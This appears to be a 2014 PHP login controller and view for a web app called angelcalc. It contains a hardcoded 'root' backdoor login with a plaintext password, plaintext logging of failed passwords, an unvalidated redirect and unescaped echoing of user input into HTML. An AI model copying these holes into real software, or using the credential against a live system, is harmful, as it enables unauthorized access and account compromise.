<?php
/**
 * Created by PhpStorm.
 * User: geoff
 * Date: 6/14/14
 * Time: 9:13 PM
 */


/*
 * angellogin:  controller class for login .  this file also contains the corresponding view.
 *
 * Class which displays the login screen and allows the user to login to angelcalc.
 */
class angellogin {

    protected $password     = "";
    protected $passhash     = "";    // hashed password
    protected $cost         = 10;
    public $view;

    function __construct() {
        $this->view = new angellogin_view();
    }

    /*******************
     * This method is the standard reg page
     */
    function showLoginPage($email, $headerMessage, $error) {

    angellog("login page request. msg: " . $error);

        $body = $this->view->loginPageBody($email, $headerMessage, $error);
        $this->view->outputHTML($body);
    }

    function loginUser($email, $password, $location) {
        $p = new angelPerson();
        $p->email       = $email;
        $p->password    = $password;

        $connection = $p->connect();
        if (!$connection) {
            angeldie($p->error());
        }
        /*
         * create a special backdoor  **************************************************************
         */
        if ($p->email == 'root' && $p->password == "5plus5IS10") {
            $_SESSION['auth']="root";
            $_SESSION['isAngel'] = true;
            $_SESSION['logname'] = 'root';
            $_SESSION["loggedInUserFname"] = "root";
            $_SESSION["loggedInUserColname"] = "geoff";
            $_SESSION["loggedInUserID"] = 0;
            angellog("ROOT login successful!!!");
            header("Location: " . $GLOBALS["path"] . "/index.php");
            die("");
        }

        /*******************************************************************************************/

        /*
         *  Lookup the email and if the person is found and their password matches, log them in.
         */
        $foundPerson = $p->findMatchingPerson(true);

        if ($foundPerson == NULL) {  // person was not found
            angellog("failed login/user: $p->email / $p->password");
            $this->showLoginPage($email,"Welcome!","Your login failed! Please try again");
        } elseif ($this->password_verify($p->password, $foundPerson->password)) {   // password is correct
                if ($foundPerson->state == "waitverify") {
                    /*
                     * Todo - add a "send another verification email" link
                     */
                    $this->showLoginPage($email,"Welcome!","You must verify your email address before logging in.");
                    exit();
                } elseif ($foundPerson->state != "verified")
                    angeldie("There is a problem with your registration. Please contact Geoff.");


                $_SESSION['auth'] = angelAuthUser($foundPerson);

                $_SESSION['logname'] = $foundPerson->email;
                $_SESSION["loggedInUserFname"] = $foundPerson->firstname;
                $_SESSION["loggedInUserLname"] = $foundPerson->lastname;
                $_SESSION["loggedInUserID"] = $foundPerson->id;
                $_SESSION["loggedInUserCompanyID"] = $foundPerson->company_id;
                $_SESSION["photo"] = $foundPerson->photo;
                $_SESSION["impersonating"] = false;
                $_SESSION['isAngel'] = true;        // to distinguish from IK12


                /*
                 * Check if this person is on the beta list
                 */
                $defaultLocation = "/model";
                $_SESSION["isBetaUser"] = false;
                if (file_exists($GLOBALS["betaFile"])) {
                   if ($this->checkBetaList($foundPerson->email, $GLOBALS["betaFile"])) {
                       /*
                        * We have a beta user: hooray!
                        */
                       $_SESSION['isBetaUser'] = true;
                       if ($foundPerson->firstLoginDate == null or $foundPerson->firstLoginDate == 0)
                           $defaultLocation = "/investments?help=beta";
                       else
                           $defaultLocation = "/investments?login";
                   }
                }


                if ($foundPerson->firstLoginDate == null or $foundPerson->firstLoginDate == 0) {
                    $foundPerson->firstLoginDate = date('Y-m-d H:i:s');   // save first login date
                }
                $foundPerson->lastLoginDate = date('Y-m-d H:i:s');   // save last login date

                $foundPerson->updateThisRow();

                angellog("successful login");
                if ($location == "") {
                    // angeldie("here");
                    header("Location: "  . $GLOBALS["path"] . $defaultLocation);
                } else {
                    $location = rawurldecode($location);
                    header("Location: " . $GLOBALS["path"] . "$location");
                }

        } else {   // password is not correct
            angellog("failed login/pass: $p->email / $p->password");
            $this->showLoginPage($email,"Welcome!","Your login failed! Please try again");
        }
    }

    /*
     * return true if input user/email is on the beta list in betafile, false otherwise.
     */
    function checkBetaList($email, $betaFile) {

        $betaUsers = file_get_contents($betaFile);
        if (strpos(strtolower($betaUsers), strtolower($email)) === false)
            $retVal = false;
        else
            $retVal = true;

        // angeldie("checkBetaList (email, betausers): " . angelParens($email, $betaUsers) .  " return is: " . ($retVal ? "true" : "false") );  // debug
        return($retVal);

    }

    /**
     * Generates a secure, pseudo-random password with a safe fallback.
     */
    function pseudo_rand($length) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $is_strong = false;
            $rand = openssl_random_pseudo_bytes($length, $is_strong);
            if ($is_strong === true) return $rand;
        }
        $rand = '';
        $sha = '';
        for ($i = 0; $i < $length; $i++) {
            $sha = hash('sha256', $sha . mt_rand());
            $chr = mt_rand(0, 62);
            $rand .= chr(hexdec($sha[$chr] . $sha[$chr + 1]));
        }
        return $rand;
    }

    function password_hash($password) {

        $saltStart = '$2y$' . $this->cost . '$';
        $this->password = $password;

        if (defined("CRYPT_BLOWFISH") && CRYPT_BLOWFISH) {
            $salt = $saltStart . substr(md5(uniqid(rand(), true)), 0, 22);
            $this->passhash = crypt($this->password, $salt);
            return $this->passhash;
        } else
            return NULL;
    }


    function password_verify($password, $hashedPassword) {

        // echo $password . " " . $hashedPassword . " " . crypt($password, $hashedPassword);

        return crypt($password, $hashedPassword) == $hashedPassword;
    }


}  // class angellogin

/*
 * View for angellogin
 */

class angellogin_view extends angelview {


    function __construct() {

        parent::__construct();

        $path = $GLOBALS["path"];

        $this->htmlHeader = "<title>Angel Login</title>";
        $this->header = "logoOnlyHeader.inc";

        $this->js .= "<script src='$path/jscript/livevalidation_standalone.js'></script>";
        $this->footer       = "angelfooter.inc";



    }

    function loginPageBody($email, $headerMessage, $error) {

        $body = "<div id='wrap'>
              <p style='color:#7489fe;font-size:150%;font-family: Verdana, Arial, Helvetica, sans-serif;'>$headerMessage</p><p style='margin-bottom:10px;margin-left:auto;margin-right:auto;width:90%'><hr></p><p style='text-align:center;font-size:115%'>Please Login or <a href='reg'>Register</a> to begin modeling</a></p>";
        if ($error != '')
            $body .= "<p class='ik12rlError'>$error</p>";

        $body .= "

            <form action='login' method='post'>
                    <div id='loginTable'><table>

            <tr><td><label for='email'>Email:</label></td>
                <td><div id='loginTableEntry'>

                        <input type='text' name='email' id='f20' value='$email' tabindex='1' />

                        <script type='text/javascript'>
                            var f20 = new LiveValidation('f20', {validMessage: ' '});
                            f20.add( Validate.Presence, {failureMessage: 'Please enter your email.'} );
                        </script>
                    </div></td>

                        <tr> <td><label for='password'>Password:</label>
                            <td> <div id='loginTableEntry'>
                                    <input type='password' name='password' id='f19' value='' tabindex='2' />
                                    <script type='text/javascript'>
                                        var f19 = new LiveValidation('f19', {validMessage: ' '});
                                        f19.add( Validate.Presence, {failureMessage: 'Please enter a password.'} );

                                    </script>
                                </div></td></tr>

                        <tr><td colspan='2'><div id='loginButton'>
                                <input type='submit' class='submit_button' value='Login' tabindex='3'></div></td></tr>

                        </table></div>
                        </form>
                        <!-- end registration.  Let them register or deal with forgotton password below -->
                        <div style='text-align:right;font-size:70%;font-family: Verdana, Arial, Helvetica, sans-serif;'>
                            <a href='reg'>Get an account</a> |
                            <a href='passrecover'>Forgot Password?</a>
                        </div>


                    </div>
                    <!-- end wrap div -->
                    ";



        return $body;
    }


}

